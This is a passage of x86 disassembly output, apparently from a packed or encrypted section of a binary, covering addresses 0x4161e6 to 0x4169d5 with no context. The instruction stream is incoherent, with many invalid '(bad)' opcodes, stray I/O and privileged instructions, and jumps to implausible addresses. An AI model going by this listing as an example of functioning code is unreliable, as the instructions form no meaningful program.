  4161e6:	sti    
  4161e7:	jae    0x4161e0
  4161e9:	mov    esp,0x515bf2da
  4161ee:	mov    ebx,0x40bbfe50
  4161f3:	mov    DWORD PTR ds:0x95b43c13,ebx
  4161f9:	ss push esp
  4161fb:	sahf   
  4161fc:	or     bp,sp
  4161ff:	sar    DWORD PTR [eax],1
  416201:	les    eax,FWORD PTR [ebp-0x1792a97b]
  416207:	adc    ecx,esi
  416209:	and    DWORD PTR [esi+0x15d5bb62],edx
  41620f:	outs   dx,DWORD PTR ds:[esi]
  416210:	jno    0x416216
  416212:	adc    eax,DWORD PTR [esi+0x71]
  416215:	imul   ebp,DWORD PTR gs:[ebx-0x15],0x862d4b0a
  41621d:	xor    BYTE PTR [ecx-0x48],bh
  416220:	push   0x68056db8
  416225:	fs sub al,0x29
  416228:	xchg   edx,eax
  416229:	je     0x416263
  41622b:	arpl   WORD PTR [edi],dx
  41622d:	sbb    ah,BYTE PTR ss:[edx+0x7f9c9653]
  416234:	pop    esi
  416235:	dec    eax
  416236:	and    eax,0x1c2e85a
  41623b:	repz test BYTE PTR [ebx-0x34f0199],dl
  416242:	add    ah,BYTE PTR [ebp+0x767c3c65]
  416248:	add    BYTE PTR [ecx-0x47ffa8cf],bh
  41624e:	rcl    BYTE PTR [ecx+0x3],1
  416251:	mov    cl,0x7
  416253:	or     BYTE PTR [eax+0x44],cl
  416256:	mov    ah,0xa
  416258:	call   0xc2d0:0x3e25504
  41625f:	lods   eax,DWORD PTR ds:[esi]
  416260:	es ret 0x58e9
  416264:	and    eax,0x5b6cf263
  416269:	loope  0x4162b1
  41626b:	and    al,0x2a
  41626d:	popf   
  41626e:	jno    0x416264
  416270:	outs   dx,BYTE PTR ds:[esi]
  416271:	and    al,0x8f
  416273:	ds mov dh,0xad
  416276:	sub    DWORD PTR [esi],ebp
  416278:	mov    ch,0x27
  41627a:	push   esi
  41627b:	jg     0x4162b3
  41627d:	es ins BYTE PTR es:[edi],dx
  41627f:	sub    al,0x8f
  416281:	mov    al,ds:0x2f28db5b
  416286:	xchg   esp,eax
  416287:	mov    WORD PTR [ecx],gs
  416289:	loope  0x416256
  41628b:	dec    ebx
  41628c:	pop    ebp
  41628d:	mov    al,0x2b
  41628f:	fldenv [edx+0x69]
  416292:	adc    BYTE PTR [esi+ebx*4],0x42
  416296:	push   ecx
  416297:	test   DWORD PTR [edx+0x4d],ebp
  41629a:	jge    0x41628d
  41629c:	je     0x41630b
  41629e:	add    eax,0xdb0a176d
  4162a3:	push   ebp
  4162a4:	loop   0x41623e
  4162a6:	repnz dec ecx
  4162a8:	outs   dx,BYTE PTR ds:[esi]
  4162a9:	test   DWORD PTR [ebp-0x2dccdeb3],esp
  4162af:	das    
  4162b0:	pusha  
  4162b1:	xor    DWORD PTR [esi+esi*1+0x2eda3613],esp
  4162b8:	sub    cl,BYTE PTR [edx]
  4162ba:	(bad)  
  4162bb:	jl     0x4162d4
  4162bd:	rep stos BYTE PTR es:[edi],al
  4162bf:	fcom   QWORD PTR [esi+0x2f92970a]
  4162c5:	mov    ch,0xbe
  4162c7:	pop    edi
  4162c8:	push   esp
  4162c9:	cmc    
  4162ca:	test   ebp,ebx
  4162cc:	push   eax
  4162cd:	outs   dx,BYTE PTR ds:[esi]
  4162ce:	sbb    eax,0x20f18f05
  4162d3:	mov    bh,0xf8
  4162d5:	(bad)  [esi-0x6fa14e4f]
  4162db:	outs   dx,DWORD PTR ds:[esi]
  4162dc:	loopne 0x416295
  4162de:	leave  
  4162df:	mov    esp,0xb6d93bf0
  4162e4:	shr    BYTE PTR [esi+0xb],1
  4162e7:	mov    BYTE PTR [ecx],dh
  4162e9:	pop    edi
  4162ea:	ficomp WORD PTR [esi+0xe8c88dd]
  4162f0:	lods   eax,DWORD PTR ds:[esi]
  4162f1:	ins    DWORD PTR es:[edi],dx
  4162f2:	sub    dl,ah
  4162f4:	dec    esp
  4162f5:	ins    BYTE PTR es:[edi],dx
  4162f6:	mov    al,ds:0x447a200b
  4162fb:	call   0x6a06b656
  416300:	adc    al,0xdf
  416302:	mov    edi,0xa2718e40
  416307:	xor    eax,0x668baeda
  41630c:	ja     0x4162f1
  41630e:	xchg   ebp,edx
  416310:	add    eax,0x945889b5
  416315:	mov    dh,BYTE PTR [ebx-0x49482b55]
  41631b:	sub    edx,ebx
  41631d:	xor    DWORD PTR [edx+0x3ab74d4e],ebx
  416323:	lds    eax,FWORD PTR ds:0xe2208ec7
  416329:	mov    dh,0x7d
  41632b:	or     eax,edi
  41632d:	sti    
  41632e:	sbb    DWORD PTR [ebp+0x6dda75d1],edx
  416334:	pop    ebx
  416335:	call   0xd27c4c28
  41633a:	outs   dx,BYTE PTR ds:[esi]
  41633b:	mov    al,ds:0xce9a4aad
  416340:	fld    TBYTE PTR [edi-0x46ddd94a]
  416346:	or     BYTE PTR [eax-0x281e02f5],bh
  41634c:	call   0xaf77967
  416351:	icebp  
  416352:	popf   
  416353:	inc    esi
  416354:	xchg   esp,eax
  416355:	mov    esi,0xc011229d
  41635a:	test   DWORD PTR ds:0x998582ab,ebp
  416360:	fild   QWORD PTR [ecx-0x44291757]
  416366:	imul   edi,eax,0x59
  416369:	nop
  41636a:	ret    
  41636b:	or     BYTE PTR [esp+edx*2+0x3d6dcb6d],0x83
  416373:	loopne 0x41633e
  416375:	out    0xbf,al
  416377:	sbb    DWORD PTR [ebx+0x6d],ebx
  41637a:	(bad)  
  41637c:	loope  0x4163f7
  41637e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41637f:	sub    eax,0xa3143eaa
  416384:	fild   QWORD PTR [ecx-0x42754523]
  41638a:	xor    edi,DWORD PTR [ecx+0xe]
  41638d:	cmp    BYTE PTR [ebp+0x6db79b29],al
  416393:	arpl   WORD PTR [ecx+0x35],sp
  416396:	pop    ebx
  416397:	sahf   
  416398:	xchg   DWORD PTR [edx+esi*8],eax
  41639b:	adc    DWORD PTR [edi-0x491f816b],esp
  4163a1:	rol    BYTE PTR [ecx],1
  4163a3:	sub    bh,BYTE PTR [eax+0xa]
  4163a6:	popf   
  4163a7:	dec    ebp
  4163a8:	int3   
  4163a9:	or     bh,dl
  4163ab:	mov    dh,0xed
  4163ad:	and    BYTE PTR [ebp+0x51],bl
  4163b0:	or     eax,0x843523b9
  4163b5:	cs inc ecx
  4163b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163b8:	mov    ch,ch
  4163ba:	mov    al,ds:0xebc1e6c5
  4163bf:	mov    dh,0xb1
  4163c1:	shr    BYTE PTR [esi],1
  4163c3:	test   BYTE PTR [ebp+0x50e5bf12],0x48
  4163ca:	push   es
  4163cb:	mov    eax,ds:0xc2c6e02a
  4163d0:	cwde   
  4163d1:	sub    BYTE PTR [ebx+0x6d469433],bh
  4163d7:	dec    ebp
  4163d8:	adc    BYTE PTR [edi+eiz*2-0x43],ch
  4163dc:	les    edx,FWORD PTR [ebx+0x36f695af]
  4163e2:	cmp    al,BYTE PTR [eax]
  4163e4:	mov    eax,0xa129ae65
  4163e9:	cdq    
  4163ea:	xor    ch,cl
  4163ec:	push   edx
  4163ed:	push   ebx
  4163ee:	add    eax,0x2af8c297
  4163f3:	add    BYTE PTR [esi],dl
  4163f5:	jmp    0xd09ca401
  4163fa:	popa   
  4163fb:	push   eax
  4163fc:	loop   0x41639e
  4163fe:	ins    DWORD PTR es:[edi],dx
  4163ff:	jmp    0x416409
  416401:	(bad)  
  416402:	int3   
  416403:	popf   
  416404:	add    eax,0x5f610ea1
  416409:	cmp    ecx,DWORD PTR [edx]
  41640b:	jbe    0x4163e1
  41640d:	jae    0x416468
  41640f:	push   esp
  416410:	mov    eax,ds:0x938f48e9
  416415:	pusha  
  416416:	fstp   TBYTE PTR [esi+0x6d]
  416419:	in     al,dx
  41641a:	mov    al,0x82
  41641c:	aam    0x34
  41641e:	mov    edi,0x14473854
  416423:	je     0x4163c8
  416425:	and    esi,DWORD PTR ds:0x80d21f0
  41642b:	push   0xffffffbb
  41642d:	mov    cl,0x75
  41642f:	xor    al,0xab
  416431:	cmp    ebx,DWORD PTR [eax-0x4fa39591]
  416437:	mov    esp,ecx
  416439:	mov    bh,0xda
  41643b:	scas   al,BYTE PTR es:[edi]
  41643c:	lods   eax,DWORD PTR ds:[esi]
  41643d:	mov    esi,0xeb193eaf
  416442:	mov    ds:0xa806ad00,eax
  416447:	retf   
  416448:	xchg   edi,eax
  416449:	fisub  DWORD PTR [eax]
  41644b:	inc    eax
  41644c:	add    BYTE PTR [ebx-0x58174fe8],al
  416452:	pop    ebp
  416453:	inc    ecx
  416454:	fisttp DWORD PTR [eax]
  416456:	jne    0x4164c6
  416458:	test   eax,0x1471f940
  41645d:	and    BYTE PTR [esi+0x2b2ca82d],bh
  416463:	xlat   BYTE PTR ds:[ebx]
  416464:	bound  esi,QWORD PTR [edi]
  416466:	(bad)  
  416467:	(bad)  
  416468:	outs   dx,BYTE PTR ds:[esi]
  416469:	xor    al,0x41
  41646b:	shr    BYTE PTR [eax+0x20],cl
  41646e:	sub    al,0x11
  416470:	in     eax,0xff
  416472:	test   eax,0x53c2ea8b
  416477:	int    0xef
  416479:	fs (bad) 
  41647b:	jns    0x416403
  41647d:	cli    
  41647e:	fnsave [esi+0x6f3eaa6d]
  416484:	add    eax,0xc08c6bf5
  416489:	cmp    BYTE PTR [eax-0x49723b8f],bh
  41648f:	or     DWORD PTR [ebx+edi*8+0x13a2ad79],eax
  416496:	pop    ss
  416497:	rol    BYTE PTR [edx-0x25],cl
  41649a:	inc    eax
  41649b:	or     edx,DWORD PTR [ebx]
  41649d:	adc    BYTE PTR [ebp-0x57],bh
  4164a0:	pop    edx
  4164a1:	pop    edi
  4164a2:	lods   eax,DWORD PTR ds:[esi]
  4164a3:	mov    eax,ds:0xd211c6e8
  4164a8:	test   al,0xec
  4164aa:	retf   
  4164ab:	shl    eax,1
  4164ad:	mov    ch,0xb5
  4164af:	xor    eax,0x4a6c1b88
  4164b4:	push   0x5b
  4164b6:	pusha  
  4164b7:	mov    eax,ds:0x8752b74
  4164bc:	push   eax
  4164bd:	xor    cl,BYTE PTR [esi]
  4164bf:	ret    
  4164c0:	push   es
  4164c1:	mov    WORD PTR [ecx+0x7068b616],gs
  4164c7:	cmp    BYTE PTR [ebx+0x67ec3635],bh
  4164cd:	xchg   edi,eax
  4164ce:	fist   DWORD PTR [edi]
  4164d0:	mov    bh,0xb6
  4164d2:	imul   DWORD PTR [edi-0x5a89c060]
  4164d8:	adc    eax,0x6d2dc083
  4164dd:	mov    ah,0xb
  4164df:	dec    ecx
  4164e0:	leave  
  4164e1:	not    DWORD PTR [esi-0x31]
  4164e4:	jmp    FWORD PTR [ebx+0x44]
  4164e7:	mov    cl,0xb0
  4164e9:	mov    cl,0xb0
  4164eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164ec:	cmp    ch,ah
  4164ee:	rcr    BYTE PTR [di],cl
  4164f1:	cmp    BYTE PTR [ecx],0x8d
  4164f4:	pop    ebx
  4164f5:	pop    ecx
  4164f6:	mov    edx,0xcb8a6412
  4164fb:	jl     0x416535
  4164fd:	cwde   
  4164fe:	pop    ebx
  4164ff:	add    ecx,DWORD PTR [ebp+0x14]
  416502:	mov    ebx,0xdb98d482
  416507:	sub    ecx,DWORD PTR [edx+edi*4+0x6db8823b]
  41650e:	cwde   
  41650f:	cmp    DWORD PTR [ebx],0x9ea76276
  416515:	jmp    0x4164d2
  416517:	rol    DWORD PTR [eax],1
  416519:	or     edx,DWORD PTR [ebx]
  41651b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41651c:	add    DWORD PTR [esi],ebp
  41651e:	(bad)  
  41651f:	frstor [esi]
  416521:	or     dl,al
  416523:	inc    esi
  416524:	jmp    0x3731ce6f
  416529:	sahf   
  41652a:	mov    ds:0xa96b618d,al
  41652f:	add    edx,ebp
  416531:	ja     0x41651a
  416533:	mov    esi,0x8ea7b93c
  416538:	lea    ecx,[ebp-0x2fe59e8a]
  41653e:	cld    
  41653f:	mov    eax,0x575f1b41
  416544:	test   eax,0x8bc15d82
  416549:	inc    ecx
  41654a:	out    dx,eax
  41654b:	mov    ds:0xd9617529,eax
  416550:	fsub   DWORD PTR [edx+0x2d7442ba]
  416556:	imul   ebx,eax,0x15d6d2c7
  41655c:	je     0x4165bc
  41655e:	test   esi,ebp
  416560:	jnp    0x416533
  416562:	xlat   BYTE PTR ds:[ebx]
  416563:	imul   ebp,DWORD PTR [ebp-0x1d],0xffffffc6
  416567:	(bad)  
  416568:	icebp  
  416569:	daa    
  41656a:	xor    edi,DWORD PTR [ecx]
  41656c:	nop
  41656d:	dec    edi
  41656e:	arpl   cx,si
  416570:	jno    0x416528
  416572:	pop    ebx
  416573:	jecxz  0x416577
  416575:	ror    bh,0xae
  416578:	fisttp DWORD PTR [ecx+0x5e32d9da]
  41657e:	fsubr  DWORD PTR [eax+0x3b]
  416581:	or     bh,BYTE PTR [esi+eiz*2]
  416584:	cwde   
  416585:	add    eax,0xb6db378
  41658a:	or     eax,DWORD PTR [ebp+0x1034dc42]
  416590:	popf   
  416591:	mov    DWORD PTR [eax],ecx
  416593:	sub    ebp,eax
  416595:	mov    dh,0xb4
  416597:	cmp    esi,DWORD PTR [ecx]
  416599:	sahf   
  41659a:	dec    ebx
  41659b:	into   
  41659c:	and    eax,0x752da930
  4165a1:	add    al,0xb0
  4165a3:	stc    
  4165a4:	add    bl,BYTE PTR [ecx]
  4165a6:	ret    0xd005
  4165a9:	pop    edx
  4165aa:	adc    BYTE PTR [esi],0x2d
  4165ad:	sar    DWORD PTR [edx-0x4a],1
  4165b0:	sahf   
  4165b1:	icebp  
  4165b2:	push   0x47
  4165b4:	aam    0x86
  4165b6:	add    DWORD PTR [edi+0x2d],ebp
  4165b9:	retf   
  4165ba:	mov    edx,0x85c54d57
  4165bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165c0:	pop    ebp
  4165c1:	ss addr16 adc al,0xf6
  4165c5:	jo     0x4165c4
  4165c7:	popa   
  4165c8:	imul   ebx,DWORD PTR [ebx],0x5
  4165cb:	cmp    al,0x17
  4165cd:	sbb    al,ch
  4165cf:	sbb    bl,dl
  4165d1:	cmp    ch,BYTE PTR [edx+0x4642740d]
  4165d7:	out    dx,eax
  4165d8:	call   0x377adfb6
  4165dd:	push   ss
  4165de:	or     dl,BYTE PTR [edi]
  4165e0:	cs jno 0x41661c
  4165e3:	xor    al,0xf4
  4165e5:	xor    dl,BYTE PTR [ecx-0x6d]
  4165e8:	mov    ds:0x6b6ddb0f,al
  4165ed:	je     0x41663f
  4165ef:	bswap  esi
  4165f1:	loopne 0x4165db
  4165f3:	loopne 0x4165c9
  4165f5:	add    DWORD PTR [esi],esi
  4165f7:	lods   eax,DWORD PTR ds:[esi]
  4165f8:	and    eax,ebx
  4165fa:	mov    dh,0x70
  4165fc:	adc    BYTE PTR [esi+0x169b2c38],0x2f
  416603:	mov    dh,0xd1
  416605:	inc    esp
  416606:	sar    BYTE PTR [ebx-0x362e0144],0xe7
  41660d:	inc    esp
  41660e:	or     cl,BYTE PTR ds:0x363de89a
  416614:	dec    eax
  416615:	cli    
  416616:	add    dl,ah
  416618:	fisubr DWORD PTR [ebp-0x6d4e7713]
  41661e:	sub    BYTE PTR [esi+0x53],dl
  416621:	retf   
  416622:	mov    al,ds:0x68db702c
  416627:	pop    ss
  416628:	scas   eax,DWORD PTR es:[edi]
  416629:	lods   eax,DWORD PTR ds:[esi]
  41662a:	mov    ch,0x4a
  41662c:	lea    ecx,[edi-0x5aeca1c2]
  416632:	xchg   DWORD PTR [esi],esi
  416634:	adc    DWORD PTR [ebx+0x2b],ebp
  416637:	xchg   edx,eax
  416638:	push   eax
  416639:	pop    ebp
  41663a:	stos   BYTE PTR es:[edi],al
  41663b:	inc    ebp
  41663c:	ins    DWORD PTR es:[edi],dx
  41663d:	mov    bh,0xda
  41663f:	and    ecx,DWORD PTR [edx+0x41]
  416642:	(bad)  
  416643:	or     ebp,DWORD PTR [esi+0x59]
  416646:	sub    edx,DWORD PTR [ebp+0x74]
  416649:	jae    0x4166c0
  41664b:	lock mov ah,0x4
  41664e:	push   esi
  41664f:	in     al,dx
  416650:	popa   
  416651:	in     eax,dx
  416652:	push   esi
  416653:	fcmovu st,st(0)
  416655:	sti    
  416656:	ds cld 
  416658:	and    DWORD PTR [ebx+0x7d],ecx
  41665b:	push   ebx
  41665c:	mov    ecx,0x6c14e084
  416661:	adc    BYTE PTR [ebp-0x23],ch
  416664:	ins    BYTE PTR es:[edi],dx
  416665:	sub    al,0x4c
  416667:	in     eax,dx
  416668:	(bad)  
  416669:	mov    dh,0xd
  41666b:	or     DWORD PTR [ebx],eax
  41666d:	fcom   DWORD PTR [esp+eax*2]
  416670:	mov    dh,0x83
  416672:	dec    cl
  416674:	xor    ah,dh
  416676:	jb     0x4166e4
  416678:	(bad)  
  416679:	stc    
  41667a:	outs   dx,DWORD PTR ds:[esi]
  41667b:	cwde   
  41667c:	fld    DWORD PTR [esi]
  41667e:	ins    DWORD PTR es:[edi],dx
  41667f:	dec    ebp
  416680:	mov    bh,0xa5
  416682:	dec    ebx
  416683:	fld    TBYTE PTR [edi-0x5f]
  416686:	and    al,0x4a
  416688:	ret    
  416689:	and    DWORD PTR [ebx],esp
  41668b:	cmp    dh,cl
  41668d:	jle    0x41668f
  41668f:	ss inc ecx
  416691:	ins    BYTE PTR es:[edi],dx
  416692:	retf   
  416693:	mov    ?,esi
  416695:	sbb    ah,BYTE PTR [eax]
  416697:	add    cl,dl
  416699:	out    0x53,al
  41669b:	ins    DWORD PTR es:[edi],dx
  41669c:	fstp   TBYTE PTR [edx+0x2018d220]
  4166a2:	rcr    BYTE PTR ds:0xa0b5b04a,cl
  4166a8:	fcmovb st,st(2)
  4166aa:	sahf   
  4166ab:	aad    0x70
  4166ad:	mov    ecx,0x16dbcd83
  4166b2:	dec    edx
  4166b3:	dec    ebp
  4166b4:	push   0x864f6b8b
  4166b9:	inc    edi
  4166ba:	out    dx,al
  4166bb:	fcmovu st,st(3)
  4166bd:	inc    esp
  4166be:	mov    bh,0x76
  4166c0:	xor    al,0xdb
  4166c2:	mov    eax,ds:0xe7e99180
  4166c7:	in     al,0x47
  4166c9:	inc    esp
  4166ca:	shr    BYTE PTR [ebp-0x3d979d5d],1
  4166d0:	sub    DWORD PTR [esi],edi
  4166d2:	or     DWORD PTR [ebx+0x5d06c2d],ebp
  4166d8:	pop    edi
  4166d9:	bnd ja 0x4166f3
  4166dc:	jg     0x41669a
  4166de:	push   ss
  4166df:	cmp    cl,BYTE PTR [edx]
  4166e1:	mov    eax,0xdabed44a
  4166e6:	nop
  4166e7:	xor    al,0x30
  4166e9:	outs   dx,BYTE PTR ds:[esi]
  4166ea:	dec    ebp
  4166eb:	add    eax,0xd09592dd
  4166f0:	jo     0xb707bf76
  4166f6:	fnstsw WORD PTR [edx]
  4166f8:	xor    BYTE PTR [esi-0x58],0x3e
  4166fc:	sbb    BYTE PTR [ecx+0x4a],dh
  4166ff:	hlt    
  416700:	mov    al,0xad
  416702:	fnsave [esi-0x5e22bc7b]
  416708:	out    0xc8,al
  41670a:	sub    BYTE PTR [esi+0x54d814f8],ch
  416710:	mov    bh,0x85
  416712:	pusha  
  416713:	dec    esp
  416714:	fmul   st(3),st
  416716:	fwait
  416717:	cmp    eax,0xd436d06e
  41671c:	outs   dx,BYTE PTR ds:[esi]
  41671d:	ins    DWORD PTR es:[edi],dx
  41671e:	pop    ecx
  41671f:	(bad)  
  416720:	repnz gs inc ecx
  416723:	lds    edx,FWORD PTR [edx]
  416725:	dec    ecx
  416726:	inc    esp
  416727:	pop    ebx
  416728:	aam    0xd6
  41672a:	cs push ebx
  41672c:	xchg   DWORD PTR [edi+ebx*2],eax
  41672f:	das    
  416730:	xchg   DWORD PTR [ebx],eax
  416732:	arpl   WORD PTR [esi],ax
  416734:	sub    BYTE PTR [esi],dh
  416736:	adc    al,0x3c
  416738:	adc    eax,0x6db0ae0d
  41673d:	retf   
  41673e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41673f:	cmp    bl,BYTE PTR [esp+eax*8+0x7f]
  416743:	in     al,0x5
  416745:	xchg   esp,ebp
  416747:	ss mov eax,0xe14475b0
  41674d:	icebp  
  41674e:	(bad)  
  41674f:	sbb    DWORD PTR [edx],edi
  416751:	cmp    DWORD PTR [ecx],esp
  416753:	add    bh,BYTE PTR [esi]
  416755:	sub    al,0xdf
  416757:	push   edi
  416758:	cs add dl,cl
  41675b:	repz ds inc ebx
  41675e:	ret    0x96db
  416761:	das    
  416762:	ins    BYTE PTR es:[edi],dx
  416763:	sbb    esi,esi
  416765:	xor    ch,bh
  416767:	or     DWORD PTR [ecx+esi*1-0x3e],0x0
  41676c:	pop    ds
  41676d:	pushf  
  41676e:	inc    edx
  41676f:	rol    DWORD PTR [ebp+0x23d4d056],1
  416775:	pop    ebx
  416776:	mov    ch,0x2b
  416778:	sbb    al,BYTE PTR [edx-0x6393fe28]
  41677e:	out    dx,eax
  41677f:	fsub   DWORD PTR [edx]
  416781:	in     eax,dx
  416782:	ret    0xa56
  416785:	jb     0x41671f
  416787:	xchg   DWORD PTR [edx+esi*4-0x1da9a39e],edx
  41678e:	(bad)  
  41678f:	mov    dh,0x82
  416791:	retf   
  416792:	add    ah,BYTE PTR fs:[ecx+eax*1-0x4a131a8d]
  41679a:	fstp   QWORD PTR [edx]
  41679c:	shl    ecx,1
  41679e:	in     al,0x80
  4167a0:	(bad)  
  4167a2:	xor    eax,0xe96dc2cc
  4167a7:	push   ecx
  4167a8:	jle    0x41679c
  4167aa:	xor    al,0xe0
  4167ac:	imul   ecx,DWORD PTR [edi],0x743db497
  4167b2:	mov    eax,ds:0x5026cee9
  4167b7:	(bad)  
  4167b8:	xor    eax,0xada5d044
  4167bd:	inc    ebp
  4167be:	arpl   WORD PTR [ebx+0x508959a1],si
  4167c4:	pop    ebx
  4167c5:	mov    ebx,0xad56be55
  4167ca:	add    BYTE PTR [edx*2+0x14b61746],al
  4167d1:	mov    WORD PTR [edi+0x6c6db4b6],ds
  4167d7:	cwde   
  4167d8:	jb     0x416807
  4167da:	scas   eax,DWORD PTR es:[edi]
  4167db:	xlat   BYTE PTR ds:[ebx]
  4167dc:	mov    fs,WORD PTR [ecx-0x568bb269]
  4167e2:	stos   DWORD PTR es:[edi],eax
  4167e3:	loopne 0x416864
  4167e5:	outs   dx,BYTE PTR ds:[esi]
  4167e6:	jmp    0x416803
  4167e8:	or     dh,ch
  4167ea:	test   DWORD PTR [eax-0x4dfa8ad2],eax
  4167f0:	out    dx,al
  4167f1:	push   esi
  4167f2:	(bad)  
  4167f4:	fist   DWORD PTR [esi]
  4167f6:	(bad)  [esi]
  4167f8:	data16 in al,0xd7
  4167fb:	inc    edi
  4167fc:	std    
  4167fd:	cmp    al,0x9
  4167ff:	sub    al,0x93
  416801:	mov    cs,WORD PTR [eax]
  416803:	ss add al,al
  416806:	dec    ecx
  416807:	mov    dl,0xba
  416809:	or     ebx,DWORD PTR [ebx+0x17]
  41680c:	aam    0x1e
  41680e:	cwde   
  41680f:	pop    es
  416810:	test   DWORD PTR [esi-0x57b3d4bf],esi
  416816:	mov    ds:0x6b4d80a3,eax
  41681b:	(bad)  
  41681c:	mov    ds:0x54362c0,al
  416821:	cmp    ecx,DWORD PTR [edx]
  416823:	das    
  416824:	push   es
  416825:	bound  ecx,QWORD PTR [esi]
  416827:	call   0xa090:0x89a8095
  41682e:	jnp    0x4167b3
  416830:	data16 cmp BYTE PTR [edx-0x3d326d83],0xbd
  416838:	lds    ebp,FWORD PTR [edx-0x70924928]
  41683e:	aam    0xa4
  416840:	ja     0x41685a
  416842:	pop    ecx
  416843:	xor    ebx,DWORD PTR [ebx+0x43]
  416846:	adc    al,0x9b
  416848:	retf   0x91f8
  41684b:	sbb    al,cl
  41684d:	inc    esp
  41684e:	sbb    edx,DWORD PTR [edi+0x1d6e95b8]
  416854:	dec    ebx
  416855:	lahf   
  416856:	lods   eax,DWORD PTR ds:[esi]
  416857:	outs   dx,BYTE PTR ds:[esi]
  416858:	fwait
  416859:	ds sbb al,0xa6
  41685c:	add    BYTE PTR [edx+0x61],ah
  41685f:	fist   DWORD PTR [esi+0x5735a706]
  416865:	pop    ecx
  416866:	dec    eax
  416867:	add    DWORD PTR [edx],eax
  416869:	ret    0x74b6
  41686c:	(bad)  [ebp*1-0x4f07692f]
  416873:	jmp    0xdadc:0x2d0dfbec
  41687a:	lods   eax,DWORD PTR ds:[esi]
  41687b:	mov    dl,0xa8
  41687d:	loopne 0x4168a5
  41687f:	sbb    eax,0xe4a9ac46
  416884:	mov    al,0x2d
  416886:	je     0x416898
  416888:	out    dx,eax
  416889:	pop    ecx
  41688a:	mov    es,eax
  41688c:	ds dec esi
  41688e:	sti    
  41688f:	shr    BYTE PTR [ebp-0x3d],1
  416892:	sbb    DWORD PTR [esi],ebx
  416894:	ret    0x96e0
  416897:	jae    0x416843
  416899:	mov    ebp,DWORD PTR [edi+0x2f]
  41689c:	sub    BYTE PTR [esi-0x4c],0x6d
  4168a0:	fidivr WORD PTR [esi]
  4168a2:	xor    DWORD PTR [edx+ecx*4-0x7d3d1b52],esp
  4168a9:	mov    ds:0x41aa23ed,eax
  4168ae:	das    
  4168af:	lock lods al,BYTE PTR ds:[esi]
  4168b1:	and    eax,0x468094f
  4168b6:	in     eax,dx
  4168b7:	jp     0x416841
  4168b9:	enter  0xf74c,0xab
  4168bd:	and    esp,DWORD PTR [edx+0x6670085b]
  4168c3:	loopne 0x4168d1
  4168c5:	jbe    0x416877
  4168c7:	aam    0x96
  4168c9:	bound  esi,QWORD PTR [ebx]
  4168cb:	sbb    DWORD PTR [ecx+ebp*8],eax
  4168ce:	sbb    dh,dh
  4168d0:	jmp    0xbef31f97
  4168d5:	cmp    DWORD PTR [edx-0x32ca0a74],edi
  4168db:	pop    edi
  4168dc:	rcr    BYTE PTR [eax+ecx*4+0x2d],1
  4168e0:	bound  edi,QWORD PTR [ecx+0x3d]
  4168e3:	add    BYTE PTR [edx+0x6a],cl
  4168e6:	push   edx
  4168e7:	xor    al,0x16
  4168e9:	or     dl,BYTE PTR [edi]
  4168eb:	sbb    al,BYTE PTR [esi-0x6e]
  4168ee:	rcr    al,1
  4168f0:	popf   
  4168f1:	popf   
  4168f2:	or     eax,0x35b9620f
  4168f7:	mov    bl,BYTE PTR [edx+0x21af9450]
  4168fd:	inc    esi
  4168fe:	push   ebx
  4168ff:	aad    0x86
  416901:	aad    0xb6
  416903:	sub    al,dl
  416905:	aas    
  416906:	in     eax,dx
  416907:	jmp    0x785d:0xd9c6e280
  41690e:	push   ebx
  41690f:	retf   
  416910:	dec    eax
  416911:	outs   dx,BYTE PTR ds:[esi]
  416912:	test   DWORD PTR [edi],ebx
  416914:	pop    ebp
  416915:	enter  0x6da,0x4
  416919:	cmc    
  41691a:	(bad)  
  41691b:	mov    esi,0x6d61a4e6
  416920:	mov    ebx,DWORD PTR [edx-0x70782678]
  416926:	hlt    
  416927:	dec    ebp
  416928:	mov    bh,BYTE PTR [edx]
  41692a:	stos   BYTE PTR es:[edi],al
  41692b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41692c:	sbb    al,0x62
  41692e:	fwait
  41692f:	xchg   edi,eax
  416930:	jns    0x416977
  416932:	fist   DWORD PTR [ebx]
  416934:	xor    eax,0xc54bb188
  416939:	mov    edx,0x6d5fb42e
  41693e:	mov    ebx,0xbd6e5657
  416943:	dec    BYTE PTR [ecx+0xd]
  416946:	xchg   ebp,eax
  416947:	stos   DWORD PTR es:[edi],eax
  416948:	jno    0x416935
  41694a:	stos   BYTE PTR es:[edi],al
  41694b:	(bad)  
  41694c:	icebp  
  41694d:	xlat   BYTE PTR ds:[ebx]
  41694e:	pop    ecx
  41694f:	addr16 mov edx,0xc554dbd0
  416955:	jbe    0x4168e0
  416957:	xor    eax,0xb83d1ebc
  41695c:	aam    0x62
  41695e:	(bad)  
  41695f:	push   0xfcd246db
  416964:	push   cs
  416965:	and    DWORD PTR [edx],eax
  416967:	jno    0x416946
  416969:	adc    DWORD PTR [edi-0x69a049ca],esi
  41696f:	jnp    0x416920
  416971:	popf   
  416972:	in     eax,0x25
  416974:	mov    ch,0xb5
  416976:	pop    ebx
  416977:	inc    edi
  416978:	stos   DWORD PTR es:[edi],eax
  416979:	(bad)  
  41697b:	cs into 
  41697d:	adc    ebx,edi
  41697f:	dec    esi
  416980:	sbb    bl,0xb6
  416983:	mov    cl,0x43
  416985:	imul   edx,DWORD PTR [esi-0x1f6de2a8],0x8580f8f7
  41698f:	mov    dh,0x1
  416991:	and    BYTE PTR [esp+eax*2],cl
  416994:	xor    al,cl
  416996:	je     0x41691a
  416998:	(bad)  [esi-0x7d445d2b]
  41699e:	xor    dl,0x6e
  4169a1:	mov    ds:0xadc00d23,al
  4169a6:	or     ebx,DWORD PTR [esi+0x291762a1]
  4169ac:	or     DWORD PTR [edx+eiz*1],ebx
  4169af:	mov    eax,0x172fb46d
  4169b4:	jnp    0x416a28
  4169b6:	in     al,dx
  4169b7:	xor    eax,0xa81400fc
  4169bc:	call   0xbb3b75bf
  4169c1:	mov    cl,0x60
  4169c3:	stos   BYTE PTR es:[edi],al
  4169c4:	and    DWORD PTR [ecx-0x7fb7319c],eax
  4169ca:	jge    0x416a1d
  4169cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169cd:	lods   eax,DWORD PTR ds:[esi]
  4169ce:	and    DWORD PTR [ecx],ebx
  4169d0:	mov    ecx,0xd7864dd4
  4169d5:	or     eax,0xa1d80b4a
